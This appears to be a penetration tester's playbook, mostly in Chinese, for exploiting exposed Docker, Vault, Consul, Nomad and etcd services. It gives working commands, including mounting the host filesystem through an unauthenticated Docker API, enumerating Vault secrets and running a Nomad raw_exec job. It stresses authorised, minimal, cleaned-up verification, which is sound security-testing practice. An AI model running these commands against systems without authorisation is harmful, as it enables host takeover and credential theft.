# Infrastructure Services — Docker / Vault / Consul / Nomad / etcd

---

## Docker Remote API

### Gate

```bash
docker -H tcp://TARGET:2375 version
docker -H tcp://TARGET:2375 info
docker -H tcp://TARGET:2375 ps
```

未认证 daemon API 通常等价极高宿主机能力。授权验证优先临时容器 + 只读 host mount：

```bash
docker -H tcp://TARGET:2375 run --rm -v /:/host:ro alpine sh -c 'cat /host/etc/hostname'
```

这证明 container creation + host filesystem read。不要第一步就写 `/root/.ssh`。

如要验证 host write，使用 `/tmp/service-attack-marker` 并清理。

---

## Vault

已获 Vault token 后先能力判断：

```bash
VAULT_ADDR=http://TARGET:8200 VAULT_TOKEN="$TOKEN" vault token lookup
VAULT_ADDR=http://TARGET:8200 VAULT_TOKEN="$TOKEN" vault secrets list
```

攻击链不是“Vault=读所有密码”，而是：

```text
token policy
→ mount/path capabilities
→ dynamic credential engines
→ PKI / cloud / database credentials
→ new identity
```

对可读取 secret path 使用最小范围 `vault kv get path`。如果有 credential issuance 权限，创建**短期** test credential，验证后 revoke lease。

---

## Consul

高权 ACL token 可能具备 service/node/KV/config write。先：

```bash
curl -s -H "X-Consul-Token: $TOKEN" http://TARGET:8500/v1/acl/token/self | jq
```

不要默认使用历史 `consul exec`；现代环境是否支持 remote exec/exec driver 取决于配置版本。优先从 ACL capability 和实际 enabled feature 出发。

---

## Nomad

Nomad ACL 中 `submit-job` 是高价值 capability。

```bash
NOMAD_ADDR=http://TARGET:4646 NOMAD_TOKEN="$TOKEN" nomad acl token self
NOMAD_ADDR=http://TARGET:4646 NOMAD_TOKEN="$TOKEN" nomad namespace list
```

如果授权确认有 `submit-job`：创建最小、短生命周期 marker job，任务只执行 `id` 并输出日志；验证后 `nomad job stop -purge`。

```hcl
job "sa-marker" {
  datacenters = ["dc1"]
  type = "batch"
  group "g" {
    task "id" {
      driver = "raw_exec"
      config { command = "/usr/bin/id" }
      resources { cpu = 50 memory = 32 }
    }
  }
}
```

`raw_exec` 还受 client driver 配置限制；失败不等于 submit-job 不成立，可改为目标已启用 driver 的无害 marker。

---

## etcd

未认证/高权 client cert 对 etcd 的 read/write 直接影响存储数据。

先备份目标 key 原值；写操作只对自建 marker prefix：

```bash
ETCDCTL_API=3 etcdctl --endpoints=http://TARGET:2379 put /service-attack/marker ok
ETCDCTL_API=3 etcdctl --endpoints=http://TARGET:2379 get /service-attack/marker
ETCDCTL_API=3 etcdctl --endpoints=http://TARGET:2379 del /service-attack/marker
```

如果 keyspace 明确是 Kubernetes，cluster takeover 需要理解 Kubernetes object/storage encoding；不要直接手改 production RBAC key 作为第一验证。
